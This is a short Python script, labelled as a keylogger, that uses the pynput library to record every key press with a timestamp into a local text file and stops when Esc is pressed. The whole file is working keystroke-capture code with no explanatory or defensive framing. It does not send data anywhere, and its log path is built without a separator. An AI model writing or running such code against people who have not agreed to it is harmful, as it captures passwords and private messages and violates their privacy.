# keylogger
import pynput
from pynput.keyboard import Key, Listener
import logging

log_dir = r"D:\rrp_proj\rrp"
logging.basicConfig(filename=(log_dir + "keyLog.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    try:
        logging.info(str(key))
    except Exception as e:
        print(f"Error: {e}")

def on_release(key):
    if key == Key.esc:
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
